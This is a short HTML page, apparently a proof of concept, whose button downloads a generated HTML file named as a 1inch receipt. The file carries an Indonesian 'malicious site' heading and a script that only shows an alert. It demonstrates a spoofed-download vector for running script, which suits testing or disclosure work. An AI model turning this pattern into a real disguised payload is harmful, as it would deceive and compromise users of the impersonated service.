<!DOCTYPE html>
<html>
<body>
<button onclick="dl()">Download File</button>
<script>
function dl(){
  let blob = new Blob(['<h1>Ini file dari situs jahat</h1><script>alert("Jalan di dalam 1inch?")<\/script>'], {type:'text/html'});
  let a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = "1inch-receipt.html";
  a.click();
}
</script>
</body>
